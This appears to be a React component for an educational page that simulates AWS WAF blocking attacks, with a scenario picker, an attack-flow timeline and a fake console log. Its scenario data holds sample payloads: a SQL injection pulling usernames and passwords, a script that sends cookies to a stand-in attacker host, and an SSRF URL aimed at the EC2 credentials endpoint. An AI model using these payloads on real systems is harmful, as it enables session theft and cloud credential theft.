import { useState, useEffect, useRef } from 'react'

/* ─────────────────────────────────────────────────────────────────────
   SECURITY DEMO — SIMULATION ONLY
   This page simulates WAF attack scenarios for demonstration purposes.
   No real network requests are made. No real AWS resources are affected.
   ───────────────────────────────────────────────────────────────────── */

const SCENARIOS = [
  {
    id: 'sqli',
    name: 'SQL Injection Attack',
    category: 'Injection',
    severity: 'critical',
    description: 'Simulates a classic SQL injection payload attempting to extract user data from the database.',
    payload: "GET /api/users?id=1' OR '1'='1' UNION SELECT username,password FROM users--",
    wafRule: 'AWSManagedRulesSQLiRuleSet',
    expectedAction: 'BLOCK',
    steps: [
      'Attacker crafts malicious SQL payload in URL parameter',
      'Request arrives at CloudFront edge',
      'AWS WAF inspects the URI query string',
      'SQLiRuleSet matches pattern: UNION SELECT',
      'WAF blocks request with HTTP 403 Forbidden',
      'Block event logged to CloudWatch and S3',
    ],
    riskLevel: 95,
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    category: 'Injection',
    severity: 'critical',
    description: 'Simulates a stored XSS attack injecting malicious script via a search parameter.',
    payload: 'GET /search?q=<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
    wafRule: 'XSSBlockRuleSet-v2',
    expectedAction: 'BLOCK',
    steps: [
      'Attacker injects <script> tag in search query',
      'Request travels through CloudFront',
      'WAF XSS rule scans URI and body fields',
      'Matches script tag with obfuscated payload',
      'Request blocked — HTTP 403 returned to attacker',
      'Alert generated in security dashboard',
    ],
    riskLevel: 88,
  },
  {
    id: 'ratelimit',
    name: 'HTTP Rate Limiting Attack',
    category: 'DDoS / Flood',
    severity: 'warning',
    description: 'Simulates a high-volume brute force attack against the login endpoint.',
    payload: 'POST /api/login — 6,200 requests in 60 seconds from 104.21.55.200',
    wafRule: 'RateLimitRule-4000rpm',
    expectedAction: 'BLOCK',
    steps: [
      'Bot begins flooding /api/login at ~100 req/sec',
      'AWS WAF rate-based rule tracks request count per IP',
      'IP crosses 4,000 req/min threshold at T+40s',
      'WAF automatically blocks source IP for 5 minutes',
      'Alert created: Rate Limit Exceeded',
      'Application Load Balancer stops receiving flood traffic',
    ],
    riskLevel: 72,
  },
  {
    id: 'geo',
    name: 'Geographic Block Bypass Attempt',
    category: 'Geo Control',
    severity: 'warning',
    description: 'Simulates a request from a blocked country attempting to access the API.',
    payload: 'GET /api/products — Origin: 45.155.205.85 (CN, Henan Province)',
    wafRule: 'GeoMatchRule-CN-KP-RU-IR',
    expectedAction: 'BLOCK',
    steps: [
      'Request originates from blocked region (China)',
      'CloudFront passes request to WAF for inspection',
      'WAF GeoMatch rule queries IP geolocation database',
      'IP maps to CN — blocked country code',
      'Request blocked — HTTP 403 returned',
      'Geo-block event logged and metrics updated',
    ],
    riskLevel: 55,
  },
  {
    id: 'ssrf',
    name: 'Server-Side Request Forgery (SSRF)',
    category: 'Advanced',
    severity: 'critical',
    description: 'Simulates an SSRF attack attempting to reach AWS EC2 metadata endpoint.',
    payload: 'GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    wafRule: 'AWSManagedRulesKnownBadInputs',
    expectedAction: 'BLOCK',
    steps: [
      'Attacker crafts URL pointing to EC2 metadata service',
      'URL contains 169.254.169.254 (IMDSv1 address)',
      'WAF KnownBadInputs rule matches SSRF pattern',
      'Request blocked before reaching application server',
      'CRITICAL alert raised — potential credential theft attempt',
      'Security team notified via CloudWatch alarm',
    ],
    riskLevel: 98,
  },
  {
    id: 'bot',
    name: 'Bot Traffic Detection',
    category: 'Bot Management',
    severity: 'info',
    description: 'Simulates automated scraping bot using headless Chrome with a suspicious User-Agent.',
    payload: 'GET /api/catalog — UA: HeadlessChrome/119.0.0.0 (Scrapy/2.11)',
    wafRule: 'BotControlManagedRule',
    expectedAction: 'COUNT',
    steps: [
      'Bot initiates automated crawl of product catalog',
      'User-Agent: HeadlessChrome/Scrapy detected',
      'AWS WAF Bot Control analyses request fingerprint',
      'Bot score: 94/100 (High confidence bot)',
      'Request counted and flagged (not blocked — rule in COUNT mode)',
      'Bot traffic report updated in WAF analytics',
    ],
    riskLevel: 42,
  },
]

const LOG_TEMPLATES = {
  sqli: [
    { t: 0, type: 'info', msg: 'Simulation started — SQL Injection scenario loaded' },
    { t: 600, type: 'info', msg: 'Crafting malicious SQL payload...' },
    { t: 1200, type: 'warning', msg: "Sending: GET /api/users?id=1' OR '1'='1' UNION SELECT..." },
    { t: 1800, type: 'info', msg: 'Request received by CloudFront edge — us-east-1' },
    { t: 2400, type: 'info', msg: 'Forwarding to AWS WAF for inspection...' },
    { t: 3000, type: 'warning', msg: 'WAF: Scanning URI query string components' },
    { t: 3600, type: 'warning', msg: "WAF: MATCH — Pattern 'UNION SELECT' in SqliMatchStatement" },
    { t: 4200, type: 'critical', msg: 'WAF ACTION: BLOCK — Rule: AWSManagedRulesSQLiRuleSet' },
    { t: 4800, type: 'critical', msg: 'Response: HTTP/1.1 403 Forbidden returned to attacker' },
    { t: 5400, type: 'success', msg: 'Event logged to CloudWatch Logs group: /aws/waf/logs' },
    { t: 6000, type: 'success', msg: '✓ Attack successfully blocked. Application servers never reached.' },
  ],
}

export default function SecurityDemo() {
  const [selected, setSelected] = useState(null)
  const [running, setRunning] = useState(false)
  const [logs, setLogs] = useState([])
  const [step, setStep] = useState(0)
  const [done, setDone] = useState(false)
  const logsEndRef = useRef(null)
  const timerRefs = useRef([])

  function scrollToBottom() {
    logsEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }

  useEffect(() => { scrollToBottom() }, [logs])

  function selectScenario(sc) {
    if (running) return
    setSelected(sc)
    setLogs([])
    setStep(0)
    setDone(false)
  }

  function runSimulation() {
    if (!selected || running) return
    setRunning(true)
    setLogs([])
    setStep(0)
    setDone(false)

    // Clear old timers
    timerRefs.current.forEach(clearTimeout)
    timerRefs.current = []

    const steps = selected.steps
    const logTemplate = LOG_TEMPLATES[selected.id] || steps.map((s, i) => ({
      t: i * 900,
      type: i === steps.length - 1 ? 'success' : i > steps.length - 3 ? 'critical' : i > 1 ? 'warning' : 'info',
      msg: s,
    }))

    logTemplate.forEach(({ t, type, msg }, i) => {
      const tid = setTimeout(() => {
        setLogs(prev => [...prev, { type, msg, ts: new Date().toLocaleTimeString() }])
        setStep(i + 1)
        if (i === logTemplate.length - 1) {
          setRunning(false)
          setDone(true)
        }
      }, t)
      timerRefs.current.push(tid)
    })
  }

  function resetSim() {
    timerRefs.current.forEach(clearTimeout)
    setRunning(false)
    setLogs([])
    setStep(0)
    setDone(false)
  }

  const logColor = {
    info: 'var(--status-info)',
    warning: 'var(--status-warning)',
    critical: 'var(--status-critical)',
    success: 'var(--status-success)',
  }

  const logPrefix = { info: '[INFO]', warning: '[WARN]', critical: '[CRIT]', success: '[ OK ]' }

  return (
    <>
      {/* ── SIMULATION NOTICE — Clearly labeled ── */}
      <div className="simulation-banner">
        <span className="simulation-banner-icon">🧪</span>
        <div className="simulation-banner-text">
          <strong>⚠ Simulation Environment — No Real Attacks Are Performed</strong>
          <span>
            All scenarios on this page are <strong>demonstrations only</strong>. No actual network requests,
            AWS API calls, or malicious payloads are executed. This is a frontend-only simulation
            designed to visualise how AWS WAF responds to common threat vectors.
          </span>
        </div>
      </div>

      <div className="page-title-row">
        <div>
          <h1 className="page-title">Security Demo</h1>
          <p className="page-subtitle">Interactive WAF attack scenario simulator — for educational purposes only</p>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1.4fr', gap: '16px' }}>
        {/* Scenario list */}
        <div>
          <div style={{ marginBottom: '12px', fontSize: '12px', color: 'var(--text-muted)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.08em' }}>
            Choose a Scenario
          </div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            {SCENARIOS.map(sc => (
              <div
                key={sc.id}
                id={`scenario-${sc.id}`}
                className="card"
                style={{
                  cursor: running ? 'not-allowed' : 'pointer',
                  opacity: running && selected?.id !== sc.id ? 0.5 : 1,
                  borderColor: selected?.id === sc.id ? 'var(--border-accent)' : 'var(--border-card)',
                  background: selected?.id === sc.id ? 'var(--bg-card-hover)' : 'var(--bg-card)',
                  padding: '14px 16px',
                  transition: 'all 0.2s ease',
                }}
                onClick={() => selectScenario(sc)}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '6px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span style={{ fontSize: '14px', fontWeight: 700, color: 'var(--text-primary)' }}>{sc.name}</span>
                  </div>
                  <span className={`badge badge-${sc.severity}`}>{sc.severity.toUpperCase()}</span>
                </div>
                <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginBottom: '8px' }}>{sc.description}</div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span className="badge badge-neutral">{sc.category}</span>
                  <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Risk Score:</span>
                  <div className="progress-wrap" style={{ flex: 1 }}>
                    <div className="progress-bar" style={{
                      width: `${sc.riskLevel}%`,
                      '--prog-color': sc.riskLevel > 80 ? 'var(--status-critical)' : sc.riskLevel > 55 ? 'var(--status-warning)' : 'var(--status-info)',
                      '--prog-color-end': sc.riskLevel > 80 ? '#ff6b7a' : sc.riskLevel > 55 ? '#ffc24d' : '#5bb8ff',
                    }} />
                  </div>
                  <span style={{ fontSize: '11px', fontWeight: 700, color: 'var(--text-primary)', minWidth: '28px' }}>{sc.riskLevel}</span>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Simulation panel */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          {/* Scenario detail */}
          {selected ? (
            <div className="card">
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '14px' }}>
                <div>
                  <div style={{ fontSize: '16px', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '4px' }}>{selected.name}</div>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <span className={`badge badge-${selected.severity}`}>{selected.severity.toUpperCase()}</span>
                    <span className="badge badge-neutral">{selected.category}</span>
                    <span className={`badge ${selected.expectedAction === 'BLOCK' ? 'badge-critical' : 'badge-warning'}`}>Expected: {selected.expectedAction}</span>
                  </div>
                </div>
              </div>

              {/* Payload */}
              <div style={{ background: 'var(--bg-primary)', padding: '12px 14px', borderRadius: 'var(--radius-md)', marginBottom: '14px', border: '1px solid var(--border-subtle)' }}>
                <div style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '6px' }}>Simulated Payload</div>
                <code className="font-mono" style={{ fontSize: '11px', color: 'var(--status-critical)', wordBreak: 'break-all', lineHeight: 1.6 }}>
                  {selected.payload}
                </code>
              </div>

              {/* WAF Rule matched */}
              <div style={{ background: 'var(--surface-1)', padding: '10px 14px', borderRadius: 'var(--radius-md)', marginBottom: '14px' }}>
                <div style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '4px' }}>WAF Rule Triggered</div>
                <code className="font-mono" style={{ fontSize: '12px', color: 'var(--status-info)' }}>{selected.wafRule}</code>
              </div>

              {/* Steps */}
              <div>
                <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '10px' }}>Attack Flow</div>
                <div className="timeline">
                  {selected.steps.map((s, i) => {
                    const isActive = i < step
                    const isRunning = i === step - 1 && running
                    return (
                      <div key={i} className="timeline-item">
                        <div className="timeline-dot" style={{
                          background: isActive ? (i === selected.steps.length - 1 ? 'var(--status-success-bg)' : 'var(--status-critical-bg)') : 'var(--surface-2)',
                          color: isActive ? (i === selected.steps.length - 1 ? 'var(--status-success)' : 'var(--status-critical)') : 'var(--text-muted)',
                          fontSize: '11px',
                        }}>
                          {isRunning ? '⟳' : isActive ? (i === selected.steps.length - 1 ? '✓' : '!') : i + 1}
                        </div>
                        <div className="timeline-content" style={{ paddingTop: '4px' }}>
                          <div className="timeline-text" style={{ color: isActive ? 'var(--text-primary)' : 'var(--text-muted)', transition: 'color 0.3s' }}>
                            {s}
                          </div>
                        </div>
                      </div>
                    )
                  })}
                </div>
              </div>
            </div>
          ) : (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '300px', color: 'var(--text-muted)' }}>
              <div style={{ fontSize: '40px', marginBottom: '16px' }}>🛡️</div>
              <div style={{ fontSize: '15px', fontWeight: 600, marginBottom: '6px' }}>Select a Scenario</div>
              <div style={{ fontSize: '13px', textAlign: 'center', maxWidth: '260px' }}>
                Choose an attack scenario from the left panel to begin the simulation.
              </div>
            </div>
          )}

          {/* Console log */}
          <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
            <div style={{
              padding: '12px 16px', borderBottom: '1px solid var(--border-subtle)',
              display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              background: 'var(--surface-1)',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <span style={{ display: 'flex', gap: '5px' }}>
                  <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ff5f57' }} />
                  <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ffbd2e' }} />
                  <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#27c93f' }} />
                </span>
                <span className="font-mono" style={{ fontSize: '12px', color: 'var(--text-muted)' }}>
                  waf-sim ~ simulation console
                </span>
                {running && <span style={{ fontSize: '10px', color: 'var(--status-success)', display: 'flex', alignItems: 'center', gap: 4 }}><span className="status-dot" style={{ width: 5, height: 5 }} />RUNNING</span>}
              </div>
              <div style={{ display: 'flex', gap: '8px' }}>
                {selected && !running && (
                  <button
                    id="run-sim-btn"
                    className="btn btn-primary btn-sm"
                    onClick={runSimulation}
                    disabled={!selected}
                  >
                    ▶ Run Simulation
                  </button>
                )}
                {(running || logs.length > 0) && (
                  <button id="reset-sim-btn" className="btn btn-ghost btn-sm" onClick={resetSim}>
                    ↺ Reset
                  </button>
                )}
              </div>
            </div>

            <div style={{
              background: '#050810',
              fontFamily: 'var(--font-mono)',
              fontSize: '12px',
              padding: '14px',
              height: '240px',
              overflowY: 'auto',
              display: 'flex',
              flexDirection: 'column',
              gap: '4px',
            }}>
              {logs.length === 0 ? (
                <span style={{ color: 'var(--text-muted)', opacity: 0.5 }}>
                  {selected
                    ? '$ Ready. Press "Run Simulation" to start.'
                    : '$ Select a scenario to begin...'}
                </span>
              ) : logs.map((log, i) => (
                <div key={i} style={{ display: 'flex', gap: '10px' }}>
                  <span style={{ color: 'var(--text-muted)', flexShrink: 0 }}>{log.ts}</span>
                  <span style={{ color: logColor[log.type], flexShrink: 0 }}>{logPrefix[log.type]}</span>
                  <span style={{ color: log.type === 'success' ? 'var(--status-success)' : log.type === 'critical' ? 'var(--status-critical)' : 'var(--text-secondary)' }}>
                    {log.msg}
                  </span>
                </div>
              ))}
              {done && (
                <div style={{ marginTop: '8px', padding: '8px', background: 'rgba(0,214,143,0.08)', borderRadius: '4px', color: 'var(--status-success)' }}>
                  ✓ Simulation complete. AWS WAF successfully blocked the attack.
                </div>
              )}
              <div ref={logsEndRef} />
            </div>
          </div>

          {/* Disclaimer */}
          <div style={{
            padding: '12px 16px',
            background: 'var(--status-warning-bg)',
            border: '1px solid rgba(217, 119, 6, 0.2)',
            borderRadius: 'var(--radius-md)',
            fontSize: '11px',
            color: 'var(--text-secondary)',
            lineHeight: 1.6,
          }}>
            <strong style={{ color: 'var(--status-warning)' }}>🔒 SIMULATION DISCLAIMER:</strong> This Security Demo is a
            purely visual representation. No actual HTTP requests, SQL queries, script executions, or AWS API calls are
            made. All payloads, IPs, logs, and WAF rule matches are simulated in the browser for educational and
            demonstration purposes only.
          </div>
        </div>
      </div>
    </>
  )
}
